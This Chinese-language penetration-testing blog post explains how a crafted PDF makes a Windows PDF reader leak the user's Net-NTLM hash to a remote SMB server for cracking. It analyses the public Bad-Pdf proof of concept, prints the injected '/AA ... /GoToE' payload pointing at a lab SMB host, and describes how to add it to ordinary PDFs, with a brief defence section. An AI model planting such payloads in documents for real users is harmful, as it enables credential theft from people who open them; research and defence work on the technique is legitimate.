---
layout: post
title: 渗透技巧——利用PDF文件获取Net-NTLM hash
---


## 0x00 前言
---

今年4月，来自CheckPoint的Assaf Baharav公开了一个方法，利用PDF文件的正常功能够窃取Windows系统的NTLM Hash。

具体的说，当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net
 NTLM Hash，通过进一步破解就有可能获得用户系统的明文密码。

然而Microsoft、Adobe和FoxIT对此没有进行针对性的修复。

这个利用方法成功的条件有哪些？没有修复的原因又是什么呢？

本文将要站在技术研究的角度进行介绍

## 0x01 简介
---

本文将要介绍以下内容：

- 原理和利用思路
- 测试POC，生成一个恶意PDF文件
- 分析PDF文件格式
- 编写脚本实现修改正常PDF文件
- 开源代码

## 0x02 原理和利用思路
---

参考资料：

https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

### 原理

PDF规范允许为GoTobe和GoToR条目加载远程内容

 **直观的理解：**

PDF文件可以添加一项功能，请求远程SMB服务器的文件

而我们知道，Windows系统下SMB协议有一个特性：客户端在连接SMB服务器时，默认先使用本机的用户名和密码hash尝试登录，通信协议默认为Net-NTLMv1或者Net-NTLMv2

工具Hashcat提供了字典和暴力破解两种方法来还原Net-NTLMv1和Net-NTLMv2协议中的明文密码

只要在SMB服务器上进行抓包，提取关键数据，就能够获得Hashcat需要的参数，尝试破解

抓包可选择WireShark，对获得的pcap包进行解析，提取关键数据。如果使用Responder可自动提取出关键数据。

之前写过的相关文章：

[《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)

[《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)

[《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)

[《Windows下的密码hash——Net-NTLMv1介绍》](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/)

类似的利用思路：

可参考以下文章：

https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/

介绍了多种文件格式的利用方法

### 利用思路

- 构造一份特殊的PDF文档，请求SMB服务器的一份文件
- 在SMB服务器上抓包
- 用户使用PDF阅读器打开PDF文档时，Windows系统将当前用户的Net NTLM Hash发送到SMB服务器
- SMB服务器提取出Net NTLM Hash，使用Hashcat进行破解
- 还原出用户的明文密码
- 根据用户的明文密码尝试进一步利用

## 0x03 测试POC
---

Assaf Baharav在他的文章中已经公开了POC，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-1.png)

**注：**

图片引用自https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

如果想要直接进行测试，可参考Deepu TV的POC，地址如下：

https://github.com/deepzec/Bad-Pdf

### 实际测试

Client:

- IP: 192.168.62.135
- OS: Win7 x86

SMB Server：

- IP: 192.168.62.139
- OS: Win8 x86
- 开放共享文件夹: test

#### 1、使用Bad-Pdf生成PDF文件

本次测试对Bad-Pdf.py做部分修改，不执行Responder

设置host IP: `192.168.62.139`

协议选择`SMB`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-2.png)

生成测试PDF文件`badpdf.pdf`

#### 2、SMBServer进行抓包

开启Wireshark

#### 3、Clinet使用Adobe Reader打开badpdf.pdf

#### 4、查看Wireshark，成功获得Net NTLM Hash的数据包

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-3.png)

## 0x04 POC细节分析
---

参考代码：

https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py

Assaf Baharav的POC是在脚本中写好了PDF文件的模板

下面对其中的关键代码进行说明：

(1)

```
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
```


`/Type /Pages`表示对象的类型为页码

`/Kids[3 0 R]`表示页的对象是3

`/Count 1`表示页码数量为1

(2)

```
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
```

`/Parent 2 0 R`表示父对象是2，同(1)中`/Kids[3`对应

`/MediaBox`表示页面的显示大小（以象素为单位）

(3)

```
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
```

`xref`表示这部分为交叉引用表

`0 4`表示下面各行所描述的对象号是从0开始，并且有4个对象

`0000000000 65535 f`固定格式，可看作文件头

`0000000015 00000 n`对应第一个对象，`0000000015`表示偏移地址(十进制);`00000`为5位产生号（最大为65535），0表明该对象未被修改过; n表示该对象在使用，如果为f，表示该对象为free

(4)

```
trailer
<</Size 4/Root 1 0 R>>
startxref
190

...中间省略的代码...

trailer
<<
	/Root 1 0 R
>>
%%EOF

```

`trailer`表示文件尾trailer对象的开始

`/Size 4`表示该PDF文件的对象数目为4

`/Root 1 0 R`表示根对象的对象号为1

`startxref 190`表示交叉引用表的偏移地址为190

`%%EOF`表示文件结束标志

(5)

```
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (''' + host + '''test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
```

此处为关键代码，实现远程访问

`/Contents 4 0 R`表示页面内容对象的对象号为4

`/Parent 2 0 R`表示父对象是2

在`/Contents 4 0 R`和`/Parent 2 0 R`直接为实现远程访问的代码

对于PDF文件格式，不需要换行符，所以这段代码去掉换行符和空格，填入ServerIP后为`/AA <</O <</F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE>>>>`

## 0x05 修改正常PDF文件
---

接下来，尝试修改正常的文件，添加代码，实现远程访问功能

使用工具生成的PDF文件一般都很大，分析格式不是很方便，这里提供一个python生成PDF的参考代码，地址如下：

http://code.activestate.com/recipes/189858/

输入txt文件，输出pdf文件

### 实际测试

1.txt的内容为：

```
1234567
```

cmd:

```
recipe-189858-1.py 1.txt
```

生成的pdf文件`1.txt.pdf`，文件大小1213 bytes

查看1.txt.pdf的文件格式，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/3-1.png)

在`/Parent 3 0 R`和`/Resources 5 0 R`直接添加代码`/AA <</O <</F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE>>>>`

**注:**

需要十六进制编辑，使用文本编辑会导致PDF文件出错

对PDF文件添加上述代码后，交叉引用表中对象的偏移位置会出现偏差，需要重新计算，修正偏移位置

使用Adobe Reader打开修改后的文件`1.txt.pdf`，SMB服务器成功抓到Net NTLM Hash，修改成功

## 0x06 脚本编写
---

经实际测试，不修正交叉引用表中对象的偏移位置，不会影响PDF文件的正常访问

所以脚本编写上只需要定位`/Parent <n> 0 R`后，添加访问远程文件的代码即可

值得注意的是PDF文件的读取和写入需要以二进制格式

实现代码已开源，可参考：

https://github.com/3gstudent/Worse-PDF

## 0x07 利用分析
---

成功利用需要满足以下条件：

- 用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行

对于Windows系统，通过Net NTLM Hash破解出明文有一定难度

即使破解出了明文，利用的效果也有限(例如普通用户的Windows系统很少开启远程登录功能)

## 0x08 防御
---

虽然微软并未针对这个利用方法进行针对性的修复，但在之前已经提供了一个防御的方法，参考地址：

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014

但只支持Win10和Server2016

## 0x09 小结
---

本文测试了利用PDF文件获取Net-NTLM hash的方法，分析原理，根据PDF的文件格式尝试编写脚本实现修改正常的PDF文件，开源代码，总结利用条件。

最后，个人也认为Microsoft没有必要对此进行针对性的修复。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






